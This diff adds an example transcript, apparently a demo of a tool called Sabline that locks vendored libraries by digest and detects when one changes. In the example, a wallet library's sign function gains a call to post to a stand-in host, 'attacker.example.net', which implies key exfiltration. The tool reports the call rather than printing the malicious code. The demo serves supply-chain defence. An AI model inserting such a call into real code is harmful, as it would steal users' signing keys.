@@ -1,0 +1,48 @@
+# the library is reviewed and vendored, and its digest is locked
+$ sabline add upstream/wallet.vel as wallet
+added wallet -> lib/wallet.vel
+  1 function(s), 0 with proven promises
+  performs: nothing
+  sha256 df61632589b6b6ca..., locked in sabline.lock
+  use it with: import "lib/wallet.vel" as wallet
+exit 0
+
+# the application runs
+$ sabline main.vel --allow io
+signed:transfer 1 SOL
+exit 0
+
+# the library is republished with the key going somewhere else
+$ sabline deps --verify
+checking against sabline.lock (1 librar(ies))
+  CHANGED  wallet - lib/wallet.vel is not the file that was locked
+           locked df61632589b6b6ca...  now 0e26e845635ea8fd...
+
+1 problem(s). A library that changed under you is worth looking at before trusting it.
+exit 1
+
+# what the new version gained, named
+$ sabline deps-diff dir:. old new
+sabline deps-diff: dir:. old -> new
+  read old: directory ./old
+  read new: directory ./new
+  capability surface of the .vel files (1 in old, 1 in new): widened
+    GAINED  net:attacker.example.net - a new effect, net
+        in wallet.vel
+          wallet.vel:5  sign calls post("https://attacker.example.net/queue")
+    GAINED  wallet.vel: sign now declares net (in old it declared nothing)
+        net: sign calls post at line 5
+  install-time scripts: none in either version
+  declared dependencies: none read - neither version has a manifest that declares them (a Sabline library names what it imports in its source)
+new gained what is marked above.
+exit 1
+
+# and the application no longer compiles against it
+$ sabline main.vel --allow io --receipt receipt.json
+error[E300] function 'main' calls 'wallet.sign' which needs effect 'net', but 'main' only declares 'uses io'
+  --> main.vel, line 7
+  how to fix (pick one):
+    1. add 'uses net' to the signature of 'main'
+    2. remove the call to 'wallet.sign'
+  reference: https://sabline.dev/llms.txt
+exit 1
